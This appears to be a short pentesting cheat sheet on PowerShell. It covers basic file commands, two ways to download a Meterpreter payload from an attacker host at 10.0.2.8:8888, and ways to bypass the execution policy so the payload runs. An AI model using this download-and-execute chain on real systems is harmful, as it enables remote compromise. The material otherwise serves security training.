# Powershell for Pentesters

## Manipulating Files

```powershell
# Start the notepad app
Start-Process notepad.exe

Get-Process -name notepad

# Export the process information to the csv format
Get-Process | Export-Csv running_process.csv

# Copy-Item , Move-Item
Copy-Item .\IP.txt copy_IP.txt

# Get file Hash
Get-FileHash -Algorithm SHA256 .\IP.txt
```

## Downloading Files

```powershell
# First Way
(New-Object System.Net.WebClient).Downloadfile('http://10.0.2.8:8888/meterpreter-64.ps1', 'meterpreter.ps1')

# Second Way
Invoke-WebRequest 'http://10.0.2.8:8888/meterpreter-64.ps1' -OutFile "meterpreter.ps1"
```

To get Execution policy we can run `Get-ExecutionPolicy -list`.

Execution policies can have seven different values;

    - AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.

    - Bypass: All scripts can run, and no warnings or prompts will be displayed.

    - Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows servers.

    - RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.

    - Restricted: The default configuration for Windows clients. Allows individual commands to run, does not allow scripts.

    - Undefined: This shows that no specific execution policy was set. This means default execution policies will be enforced.

    - Unrestricted: Most scripts will run.

To by pass the ExecutionPolicy we can run
```powershell
# First way
powershell -ExectionPolicy Bypass -File .\meterpreter.ps1

# Second way: -scope make only be able run for current powershell session
Set-ExecutionPolicy Bypass -scope Process
```
